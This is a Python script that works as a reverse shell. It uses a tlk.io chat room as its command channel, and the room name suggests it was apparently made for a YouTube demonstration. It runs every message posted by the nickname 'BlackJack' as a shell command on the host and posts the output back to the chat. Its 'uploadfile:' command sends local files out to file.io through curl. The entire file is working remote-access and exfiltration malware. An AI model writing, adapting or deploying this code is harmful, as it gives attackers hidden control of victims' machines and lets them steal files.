import os
import subprocess
import re
import requests
import json
from time import sleep


IDs = []

def upload_file_from_linux(lfile) : #it might be need to change for windows
    print(type(lfile))
    file = "".join(lfile)
    print(type(file))
    print(file)
    file = 'curl -F "file=@{}" https://file.io'.format(file)
    output = subprocess.check_output(file, shell=True)
    output = output.decode("utf-8")
    #print(output)
    return output


sess = requests.session()
sess.post('https://tlk.io/api/participant', data={"nickname": "FuckSchool"})
res = sess.get("https://tlk.io/reversshelltestforyoutube2")
line = res.text.strip().split("\n")[382]
pattern = r"Talkio\.Variables\.chat_id = '(\d+)'"

# Search for the pattern in the text
match = re.search(pattern, res.text)
#chat_id="8853205"
chat_id=match.group(1)

while True:
    res = json.loads(sess.get(f"https://tlk.io/api/chats/{chat_id}/messages").text)
    #print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
    #print (type(res))
    #print (len(res))kkkkkkkkkkkkkkkkkkkkk
    #print (res)
    #print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
    res = res[int(len(res)-1) : ]
    for message in res:
        if message['nickname'] == 'BlackJack' and message['id'] not in IDs:
            tokens = message['body'].split()
            #print(message)
            #print('----------')
            #print(tokens[0])
            if tokens[0] == 'cd' :
                if len(tokens) > 1 :
                    try:
                        os.chdir(tokens[1])
                    except:
                        res = subprocess.getoutput("")
                else :
                    res = subprocess.getoutput("echo 'EROR : cd to wher ??'")
            if tokens[0] == 'uploadfile:' :
                if len(tokens) > 1:
                    print(tokens[1:])
                    a = upload_file_from_linux(tokens[1:])
                    print(type(a))
                    res = subprocess.getoutput("echo "+a)   
                    res = res.replace('https://file.io','fileio')
            else:
                res = subprocess.getoutput(message['body'])
                #print("------>"+res)
            IDs.append(message['id'])
            sess.post(f"https://tlk.io/api/chats/{chat_id}/messages", data={'body': res, 'expired': 'false'})
    sleep(1)

